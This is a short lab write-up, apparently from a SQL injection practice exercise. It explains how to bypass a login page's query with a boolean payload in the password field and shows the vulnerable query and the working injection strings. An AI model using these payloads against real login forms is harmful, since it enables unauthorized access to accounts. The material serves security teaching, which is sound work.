## Login Page
1. POST method
2. **account**->true AND **password**->true  
  
### Solution
Source code:  
```sql
SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1
```
To POST data, you can **enable POST data** in hackbar.  
Then if you use this payload:  
```sql
uname=test' or 1=1#&passwd=test
```
You must fail...  
```sql
// AND have more priority than OR
True AND false
```
So, you should use...
```sql
uname=test&passwd=test' or 1=1#
// Then it will become
False or True
```  
Then, we can login success!  
  
In this case, we should know how to utilize the boolean result to get what we want.  
so, we can use ```xxx or 1=1#``` to make sure the sql clause first  
because page may show error if ```warning: sql syntax error```
